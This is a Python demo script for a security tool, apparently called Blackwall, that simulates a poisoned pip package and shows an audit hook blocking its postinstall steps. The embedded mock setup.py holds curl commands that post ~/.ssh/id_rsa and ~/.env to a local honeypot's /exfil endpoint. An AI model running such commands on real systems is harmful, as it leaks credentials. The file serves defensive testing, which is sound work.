"""The Poisoned Package demo scenario (TASK-G04).

Demonstrates Blackwall's defense-in-depth across two enforcement layers:
1. Protocol layer (MCP Gateway): ALLOWs a legitimate ``run_command`` tool call
   (``pip install ./mock_malicious_pkg``) and forwards it downstream.
2. Runtime layer (Python Audit Hook via ``AuditHookManager`` / ``sys.addaudithook``):
   Executes the package's postinstall script inside an isolated child Python
   subprocess and blocks all three runtime escape vectors (``subprocess.Popen``,
   ``os.system``, and ``socket.connect`` to the local honeypot C2) with
   ``PermissionError``.

Attack taxonomy:
- OWASP LLM05 — Supply Chain Vulnerabilities (https://genai.owasp.org/)
- MITRE ATLAS AML.T0049 — Exploit ML Supply Chain
  (https://atlas.mitre.org/techniques/AML.T0049)

Isolation & transport invariants:
- Audit Hook Rule 4 (testing_and_hygiene.md): ``sys.addaudithook`` is confined
  to an isolated child subprocess so the parent pytest runner is never polluted.
- Rule 76: exposes ``run_poisoned_package(tmpdir, *, transport="in-process")``
  with ``in-process`` (default for pytest) and ``live`` (real honeypot HTTP +
  real gateway stdio subprocess + isolated postinstall child subprocess),
  writing ``$TMPDIR/poisoned_package_results.json``.
- Direct execution is supported:
  ``python scripts/gateway_demo/scenario_poisoned_package.py``.
"""

from __future__ import annotations

import os
import sys
from pathlib import Path

# Repository bootstrap (mock_app.py / Rule 76 precedent): allow direct
# execution (`python scripts/...`) outside pytest. Must precede first-party imports.
_REPO_ROOT = Path(__file__).resolve().parents[2]
if str(_REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(_REPO_ROOT))
_SRC = _REPO_ROOT / "src"
if str(_SRC) not in sys.path:
    sys.path.insert(0, str(_SRC))

import argparse
import asyncio
import json
import logging
import subprocess
import tempfile
from datetime import UTC, datetime
from typing import Any

from scripts.gateway_demo import honeypot_server as hs
from scripts.gateway_demo.scenario_heist import (
    _count_capture_lines,
    _ensure_honeypot_port_free,
    _spawn_gateway_harness,
    _spawn_honeypot_subprocess,
    _stdio_call,
    _terminate_process_group,
    _wait_for_honeypot,
    build_tool_call,
)

logger = logging.getLogger(__name__)

# OWASP LLM05 / MITRE ATLAS AML.T0049 — taxonomy anchor for reviewers.
OWASP_REF = "https://genai.owasp.org/"
MITRE_REF = "https://atlas.mitre.org/techniques/AML.T0049"

POISONED_PKG_RESULT_FILENAME = "poisoned_package_results.json"
RUN_COMMAND_ID = "poisoned-pkg-install-1"

MOCK_PKG_DIRNAME = "mock_malicious_pkg"
INSTALL_COMMAND = f"pip install ./{MOCK_PKG_DIRNAME}"

EXPECTED_VECTORS = ["subprocess.Popen", "os.system", "socket.connect"]
EXPECTED_INCIDENT_TYPES = {
    "SUBPROCESS_EXECUTION",
    "SYSTEM_COMMAND_INJECTION",
    "MALICIOUS_IOC_CONNECTION",
}

_SETUP_PY_SOURCE = '''"""Mock poisoned package setup.py postinstall payload (synthetic demo)."""

import json
import os
import socket
import subprocess


def run_postinstall() -> list[str]:
    intercepted: list[str] = []

    try:
        subprocess.Popen(["curl", "http://localhost:8765/exfil", "-d", "@~/.ssh/id_rsa"])
    except PermissionError:
        intercepted.append("subprocess.Popen")

    try:
        os.system("cat ~/.env | curl -X POST http://localhost:8765/exfil -d @-")
    except PermissionError:
        intercepted.append("os.system")

    try:
        s = socket.socket()
        try:
            s.connect(("localhost", 8765))
        finally:
            s.close()
    except PermissionError:
        intercepted.append("socket.connect")

    print(json.dumps({"intercepted": intercepted}))
    return intercepted


if __name__ == "__main__":
    run_postinstall()
'''

_CHILD_AUDIT_BOOTSTRAP = '''"""Isolated child runner that attaches AuditHookManager before setup.py."""

import runpy
import sys
import time

import structlog

# Route structlog diagnostics to stderr so stdout stays pure JSON.
structlog.configure(logger_factory=structlog.PrintLoggerFactory(file=sys.stderr))

from blackwall.audit.manager import AuditHookManager

setup_py_path = sys.argv[1]
audit_db_path = sys.argv[2]

manager = AuditHookManager(db_path=audit_db_path)
conn = manager._get_conn()
now = int(time.time())
for ioc in ("localhost:8765", "127.0.0.1:8765"):
    conn.execute(
        "INSERT OR IGNORE INTO blocked_iocs (ioc, type, created_at) VALUES (?, ?, ?)",
        (ioc, "IP", now),
    )
conn.commit()
manager.start()
try:
    runpy.run_path(setup_py_path, run_name="__main__")
finally:
    manager.stop()
'''


def ensure_synthetic_fixtures(tmpdir: str | Path) -> Path:
    """Create isolated synthetic credentials and the mock malicious package."""
    root = Path(tmpdir)
    root.mkdir(parents=True, exist_ok=True)

    (root / ".env").write_text(
        "FAKE_API_KEY=demo-not-real-do-not-use\n"
        'DEMO_GCLOUD_ADC={"client_id": "demo-client"}\n',
        encoding="utf-8",
    )
    ssh_path = root / ".ssh" / "id_rsa"
    ssh_path.parent.mkdir(parents=True, exist_ok=True)
    ssh_path.write_text(
        "BW_SYNTHETIC_MOCK_SSH_KEY_0192 demo-not-real-do-not-use\n",
        encoding="utf-8",
    )
    try:
        ssh_path.chmod(0o600)
    except OSError:
        pass

    pkg_dir = root / MOCK_PKG_DIRNAME
    pkg_dir.mkdir(parents=True, exist_ok=True)
    (pkg_dir / "setup.py").write_text(_SETUP_PY_SOURCE, encoding="utf-8")
    return root


def _event(verdict: str, **fields: Any) -> dict[str, Any]:
    record: dict[str, Any] = {
        "ts": datetime.now(UTC).isoformat(),
        "verdict": verdict,
    }
    record.update(fields)
    return record


async def _poisoned_package_downstream(payload: dict[str, Any]) -> dict[str, Any]:
    """Mock downstream echoing the ALLOW'd run_command tool call."""
    params = payload.get("params", {}) if isinstance(payload, dict) else {}
    return {
        "jsonrpc": "2.0",
        "id": payload.get("id"),
        "result": {
            "content": [
                {
                    "type": "text",
                    "text": f"echo:{params.get('name', '')}",
                }
            ],
            "echoedTool": params.get("name", ""),
            "echoedArguments": params.get("arguments", {}),
        },
    }


class _PoisonedPackageResolver:
    """Deterministic GCP-free resolver that ALLOWs package installation."""

    async def evaluate(self, context: Any) -> Any:
        from blackwall.models import Verdict, VerdictDecision

        return Verdict(
            decision=VerdictDecision.ALLOW,
            reasoning="Poisoned Package ALLOW: legitimate package install command.",
            confidence_score=0.0,
        )


def _parse_intercepted_stdout(stdout: str) -> list[str]:
    """Extract the intercepted vector list from the child subprocess JSON stdout."""
    for line in reversed(stdout.splitlines()):
        stripped = line.strip()
        if not stripped:
            continue
        try:
            parsed = json.loads(stripped)
        except json.JSONDecodeError:
            continue
        if isinstance(parsed, dict) and isinstance(parsed.get("intercepted"), list):
            return [str(v) for v in parsed["intercepted"]]
    raise AssertionError(
        f"Child postinstall process did not emit JSON intercepted payload. stdout={stdout!r}"
    )


def _run_postinstall_in_isolated_subprocess(
    tmpdir: Path, setup_py: Path, audit_db_path: Path
) -> dict[str, Any]:
    """Execute setup.py in a fresh Python process with AuditHookManager attached."""
    env = os.environ.copy()
    env["HOME"] = str(tmpdir)
    env["BLACKWALL_DEMO_TMPDIR"] = str(tmpdir)
    existing_pp = env.get("PYTHONPATH", "")
    env["PYTHONPATH"] = str(_SRC) + (os.pathsep + existing_pp if existing_pp else "")

    proc = subprocess.run(
        [
            sys.executable,
            "-c",
            _CHILD_AUDIT_BOOTSTRAP,
            str(setup_py),
            str(audit_db_path),
        ],
        cwd=str(tmpdir),
        env=env,
        capture_output=True,
        text=True,
        timeout=20,
        check=False,
    )
    if proc.returncode != 0:
        raise AssertionError(
            f"Isolated postinstall subprocess exited {proc.returncode}: "
            f"stdout={proc.stdout!r}, stderr={proc.stderr!r}"
        )
    intercepted = _parse_intercepted_stdout(proc.stdout)
    return {
        "intercepted": intercepted,
        "stdout": proc.stdout,
        "stderr": proc.stderr,
        "returncode": proc.returncode,
    }


async def _fetch_audit_incidents(audit_db_path: Path) -> list[dict[str, Any]]:
    """Read audit_incidents persisted by the child AuditHookManager."""
    from blackwall.db.repository import SQLiteThreatRepository

    repo = SQLiteThreatRepository(db_path=str(audit_db_path))
    try:
        return await repo.getAuditIncidents()
    finally:
        close = getattr(repo, "close", None)
        if close is not None:
            res = close()
            if asyncio.iscoroutine(res):
                await res


def _assert_defense_in_depth(
    *,
    intercepted: list[str],
    incident_types: list[str],
    exfil_post_count: int | None,
    receiver_active: bool,
) -> None:
    """Enforce defense-in-depth assertions before recording a successful run."""
    missing_vectors = [v for v in EXPECTED_VECTORS if v not in intercepted]
    assert not missing_vectors and intercepted == EXPECTED_VECTORS, (
        f"Audit hook did not intercept all expected vectors {EXPECTED_VECTORS}; "
        f"missing={missing_vectors}, got={intercepted}"
    )
    missing_incidents = EXPECTED_INCIDENT_TYPES - set(incident_types)
    assert not missing_incidents, (
        f"Missing expected audit incident types {sorted(missing_incidents)}; "
        f"got={incident_types}"
    )
    if receiver_active:
        assert exfil_post_count == 0, (
            f"Honeypot /exfil received {exfil_post_count} unexpected POST(s); expected 0."
        )


def _write_results(
    tmpdir: Path,
    events: list[dict[str, Any]],
    *,
    intercepted: list[str],
    receiver_active: bool,
    exfil_post_count: int | None,
    results_path: Path | None = None,
) -> Path:
    target = results_path if results_path is not None else tmpdir / POISONED_PKG_RESULT_FILENAME
    target.parent.mkdir(parents=True, exist_ok=True)
    payload = {
        "scenario": "poisoned_package",
        "taxonomy": {"owasp": "LLM05", "mitre": "AML.T0049"},
        "owasp_ref": OWASP_REF,
        "mitre_ref": MITRE_REF,
        "receiver_active": receiver_active,
        "exfil_post_count": exfil_post_count,
        "intercepted": intercepted,
        "events": events,
    }
    target.write_text(json.dumps(payload, indent=2), encoding="utf-8")
    return target


def _build_events(intercepted: list[str]) -> list[dict[str, Any]]:
    events = [
        _event(
            "ALLOW",
            layer="mcp_gateway",
            tool="run_command",
            command=INSTALL_COMMAND,
            code="result",
            score=0.0,
            id=RUN_COMMAND_ID,
        )
    ]
    for vector in intercepted:
        events.append(
            _event(
                "BLOCK",
                layer="python_audit_hook",
                vector=vector,
                exception="PermissionError",
            )
        )
    return events


async def _run_chain(tmpdir: Path, *, results_path: Path | None = None) -> dict[str, Any]:
    from blackwall.gateway.server import MCPGatewayServer

    server = MCPGatewayServer(
        resolver=_PoisonedPackageResolver(),
        downstream_handler=_poisoned_package_downstream,
    )
    run_cmd_resp = await server.process_message(
        build_tool_call(
            RUN_COMMAND_ID,
            "run_command",
            {"command": INSTALL_COMMAND},
        )
    )
    assert "error" not in run_cmd_resp
    assert "result" in run_cmd_resp

    setup_py = tmpdir / MOCK_PKG_DIRNAME / "setup.py"
    audit_db_path = tmpdir / "audit_hooks.db"
    child_result = _run_postinstall_in_isolated_subprocess(
        tmpdir, setup_py, audit_db_path
    )
    intercepted = child_result["intercepted"]
    incidents = await _fetch_audit_incidents(audit_db_path)
    incident_types = [inc["incident_type"] for inc in incidents]

    # In-process mode runs with no live port 8765 listener (Rule 76), so zero-post
    # network proof is reserved for live mode; do not treat an absent log as proof.
    receiver_active = False
    exfil_post_count: int | None = None
    _assert_defense_in_depth(
        intercepted=intercepted,
        incident_types=incident_types,
        exfil_post_count=exfil_post_count,
        receiver_active=receiver_active,
    )

    events = _build_events(intercepted)
    written_results = _write_results(
        tmpdir,
        events,
        intercepted=intercepted,
        receiver_active=receiver_active,
        exfil_post_count=exfil_post_count,
        results_path=results_path,
    )

    return {
        "run_command_response": run_cmd_resp,
        "intercepted": intercepted,
        "audit_db_path": str(audit_db_path),
        "audit_incident_count": len(incidents),
        "audit_incident_types": incident_types,
        "receiver_active": receiver_active,
        "exfil_post_count": exfil_post_count,
        "capture_log_path": str(hs.get_capture_log_path()),
        "results_path": str(written_results),
        "events": events,
        "transport": "in-process",
    }


def _run_live(tmpdir: Path, *, results_path: Path | None = None) -> dict[str, Any]:
    """Live-transport Poisoned Package: real honeypot + gateway stdio + isolated child."""
    _ensure_honeypot_port_free()
    honeypot = _spawn_honeypot_subprocess(env=os.environ.copy())
    assert honeypot.poll() is None, "Honeypot exited immediately after start"
    gateway: subprocess.Popen[str] | None = None
    try:
        _wait_for_honeypot()
        assert honeypot.poll() is None, "Honeypot died after readiness"

        gateway = _spawn_gateway_harness(tmpdir)
        run_cmd_resp = _stdio_call(
            gateway,
            build_tool_call(
                RUN_COMMAND_ID,
                "run_command",
                {"command": INSTALL_COMMAND},
            ),
        )
        assert "error" not in run_cmd_resp
        assert "result" in run_cmd_resp

        setup_py = tmpdir / MOCK_PKG_DIRNAME / "setup.py"
        audit_db_path = tmpdir / "audit_hooks.db"
        child_result = _run_postinstall_in_isolated_subprocess(
            tmpdir, setup_py, audit_db_path
        )
        intercepted = child_result["intercepted"]
    finally:
        _terminate_process_group(gateway)
        _terminate_process_group(honeypot)

    incidents = asyncio.run(_fetch_audit_incidents(audit_db_path))
    incident_types = [inc["incident_type"] for inc in incidents]
    capture_log = hs.get_capture_log_path()
    exfil_post_count = _count_capture_lines(capture_log)
    receiver_active = True

    _assert_defense_in_depth(
        intercepted=intercepted,
        incident_types=incident_types,
        exfil_post_count=exfil_post_count,
        receiver_active=receiver_active,
    )

    events = _build_events(intercepted)
    written_results = _write_results(
        tmpdir,
        events,
        intercepted=intercepted,
        receiver_active=receiver_active,
        exfil_post_count=exfil_post_count,
        results_path=results_path,
    )

    return {
        "run_command_response": run_cmd_resp,
        "intercepted": intercepted,
        "audit_db_path": str(audit_db_path),
        "audit_incident_count": len(incidents),
        "audit_incident_types": incident_types,
        "receiver_active": receiver_active,
        "exfil_post_count": exfil_post_count,
        "capture_log_path": str(capture_log),
        "results_path": str(written_results),
        "events": events,
        "transport": "live",
    }


def run_poisoned_package(
    tmpdir: str | Path,
    *,
    transport: str = "in-process",
    results_path: str | Path | None = None,
) -> dict[str, Any]:
    """Execute The Poisoned Package scenario; write $TMPDIR/poisoned_package_results.json."""
    if transport not in ("in-process", "live"):
        raise ValueError(f"Unknown Poisoned Package transport: {transport!r}")
    root = ensure_synthetic_fixtures(tmpdir)
    resolved_results = Path(results_path) if results_path is not None else None
    prev_home = os.environ.get("HOME")
    prev_demo_dir = os.environ.get("BLACKWALL_DEMO_TMPDIR")
    os.environ["HOME"] = str(root)
    os.environ["BLACKWALL_DEMO_TMPDIR"] = str(root)
    try:
        if transport == "live":
            return _run_live(root, results_path=resolved_results)
        return asyncio.run(_run_chain(root, results_path=resolved_results))
    finally:
        if prev_home is None:
            os.environ.pop("HOME", None)
        else:
            os.environ["HOME"] = prev_home
        if prev_demo_dir is None:
            os.environ.pop("BLACKWALL_DEMO_TMPDIR", None)
        else:
            os.environ["BLACKWALL_DEMO_TMPDIR"] = prev_demo_dir


def main(argv: list[str] | None = None) -> int:
    """Manual entry point: full live demo + structured JSON log."""
    parser = argparse.ArgumentParser(description="Blackwall Poisoned Package demo (TASK-G04)")
    parser.add_argument(
        "--results-path",
        default=None,
        help="Optional explicit output path for poisoned_package_results.json.",
    )
    args = parser.parse_args(argv)
    with tempfile.TemporaryDirectory(prefix="bw-poisoned-pkg-") as tmp:
        result = run_poisoned_package(
            Path(tmp),
            transport="live",
            results_path=args.results_path,
        )
        print(
            json.dumps(
                {
                    "results_path": result["results_path"],
                    "intercepted": result["intercepted"],
                    "events": result["events"],
                }
            )
        )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
